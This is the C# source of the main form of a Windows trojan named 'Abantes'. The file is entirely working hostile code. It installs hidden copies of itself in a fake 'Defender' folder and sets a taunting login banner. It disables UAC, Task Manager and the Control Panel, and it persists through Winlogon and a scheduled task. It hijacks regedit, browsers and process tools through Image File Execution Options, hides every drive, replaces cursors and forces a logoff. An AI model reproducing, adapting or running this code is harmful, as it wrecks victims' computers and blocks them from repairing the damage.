﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Abantes.Properties;
using Abantes.Payloads;
using Abantes.Utils;
using System.Media;
using Microsoft.Win32.TaskScheduler;

namespace Abantes
{
    public partial class MainThread : Form
    {
        /* 
         * Mode 0 is the normal mode.
         * Mode 1 is debug mode.
         */
        public static int Mode = 0;

        public MainThread()
        {
            InitializeComponent();

            RegistryKey editKey;

            if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }

            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null)
            {

            }
            else
            {
                if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "DebugInfectMsg", null) == null)
                {
                    if (MessageBox.Show("INFECT SYSTEM?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
                    {
                        Environment.Exit(0);
                    }
                    else
                    {
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Abantes");
                        editKey.SetValue("DebugInfectMsg", "1");
                        editKey.Close();
                    }
                    MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, MessageBoxIcon.Warning);
                    Mode = 1;
                }
                else
                {
                    MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, 0);
                    Mode = 1;
                }
            }
            
            string extractPath = @"C:\Windows\Defender";

            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
            {
                Directory.CreateDirectory(@"C:\Windows\Defender");
                File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
                File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
                File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
                File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
                File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
                File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
                File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
                File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
                File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
                File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
                Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");

                DirectoryInfo ch = new DirectoryInfo(extractPath);
                ch.Attributes = FileAttributes.Hidden;
                

                Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);

                editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
                editKey.SetValue("", extractPath + "\\icon.ico");
                editKey.Close();
                editKey = Registry.ClassesRoot.CreateSubKey(@"exefile\DefaultIcon");
                editKey.SetValue("", extractPath + "\\icon.ico");
                editKey.Close();

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("legalnoticecaption", "Welcome To Hell");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Hope You Enjoy.");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoControlPanel", "1");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("Userinit", Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\System32\userinit.exe, " + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender\Abantes.exe", RegistryValueKind.String);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("DisableTaskMgr", "1");
                editKey.Close();

                if (MainThread.Mode == 1)
                {
                    if (MessageBox.Show("INFECT IFEO?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                        editKey.Close();
                    }
                }
                else
                {
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                    editKey.Close();
                }

                if (MainThread.Mode == 1)
                {
                    if (MessageBox.Show("CHANGE CURSOR?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("Hand", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("Wait", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("AppStarting", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("Help", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("UpArrow", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("No", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("SizeWE", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("SizeNWSE", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("SizeNS", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("SizeNESW", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("SizeAll", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                        editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
                        editKey.Close();
                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
                        editKey.SetValue("MouseTrails", "7");
                        editKey.Close();
                    }
                }
                else
                {
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("Hand", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("Wait", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("AppStarting", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("Help", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("UpArrow", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("No", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("SizeWE", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("SizeNWSE", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("SizeNS", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("SizeNESW", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("SizeAll", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                    editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
                    editKey.Close();
                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
                    editKey.SetValue("MouseTrails", "7");
                    editKey.Close();
                }

                if (MainThread.Mode == 1)
                {
                    if (MessageBox.Show("HIDE DRIVES AND DISALLOW ACCESS?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                        editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
                        editKey.Close();
                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                        editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                        editKey.Close();
                    }
                }
                else
                {
                    editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                    editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
                    editKey.Close();
                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                    editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                    editKey.Close();
                }

                Process ScriptProcess = new Process();
                ScriptProcess.StartInfo.CreateNoWindow = true;
                ScriptProcess.StartInfo.UseShellExecute = false;
                ScriptProcess.StartInfo.FileName = extractPath + "\\Action.bat";
                ScriptProcess.Start();

                TaskService ts = new TaskService();
                TaskDefinition td = ts.NewTask();
                td.Principal.RunLevel = TaskRunLevel.Highest;
                LogonTrigger interval = new LogonTrigger();
                interval.Repetition.Interval = TimeSpan.FromMinutes(1);
                td.Triggers.Add(interval);
                td.Actions.Add(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender" + @"\Abantes.exe", null));
                ts.RootFolder.RegisterTaskDefinition("Your fate.", td);

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Abantes");
                editKey.SetValue("AbantesWasHere", "1");
                editKey.Close();

                Thread.Sleep(9000);

                MessageBox.Show("Abantes Wants To Meet You", "Abantes Wants Meet You", 0, MessageBoxIcon.Warning);

                Others.StartProcess("shutdown.exe", "/l /f");
            }
            else
            {
                if (Process.GetProcessesByName("Rules").Length == 0)
                {
                    Others.StartProcess(extractPath + @"\Rules.exe", "");
                }
                Thread.Sleep(1000);
                Thread normalThread = new Thread(new ThreadStart(Threads.MainPayloadThread));
                Thread watchdogThread = new Thread(new ThreadStart(Threads.WatchDogThread));
                normalThread.Start();
                watchdogThread.Start();
            }
        }
        private void MainThread_Load(object sender, EventArgs e)
        {
            
        }
    }
}
